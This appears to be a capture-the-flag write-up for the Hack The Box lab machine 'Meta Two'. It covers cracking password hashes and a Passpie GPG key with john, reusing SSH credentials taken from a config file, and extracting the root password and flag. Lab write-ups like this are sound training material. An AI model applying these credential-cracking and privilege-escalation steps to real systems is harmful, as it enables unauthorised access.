# Meta Two





Store the passwords in a file !
> I named ```hashes```

By an brute force attack we find this
```
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes
```

We've got the manager password !
```
partylikearockstar
```

So connect to the url: ```metapress.htb/wp-admin``` by the following credentials
```
manager@metapress.htb
partylikearockstart
```





In the file ```mailer/send_email.php``` we find the jnelson ssh credentials
```
jnelson@metapress.htb
Cb4_JmWM8zUZWMu@Ys
```

We found the directory ```~/.passpie```. And inside the directory ```~/.passpie/ssh``` where We got
```
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..
-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass
```

The ```passpie``` service can helps up to the privilege scalation ! In the directory ```~/.passpie```we find the private gpg key
```
.keys
```

We can try to brute force the file. So copy the (or extract) the private gpg key part (cf. [here](./tmp/private_key.txt) )
```
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
...
...
...
V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

With ```john```, can brute force it !
```
gpg2john private_key.txt > private_key_cracked.txt
```


We generated a file where the gpg key was "broken" (cf. [here](./tmp/private_key_cracked.txt) )
```
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::private_key.txt
```

Now, use ```john``` to get the real password
```
john private_key_cracked.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

We have the password !
```
blink182
```

Let's back to the ```jnelson@meta2``` session !
```
jnelson@meta2:~$ touch pass
jnelson@meta2:~$ passpie export pass
```

We enter the password we cracked ! (```blink182```) and open the file ```pass``` ! (cf. [file](./tmp/pass) )
```
  fullname: root@ssh
  login: root
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
```

We have the root password ! let's connect as root !
```
su root
```
> Enter p7qfAZt4_A1xo_0x as password !

Get the flag at ```/root/root.txt```
```
834a8dcb8c4488aef36d213477c44ac1
```

Done !

### References 
```
https://0xdedinfosec.vercel.app/blog/hackthebox-metatwo-writeup
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
https://www.youtube.com/watch?v=vP6Uv_sqWh4
```
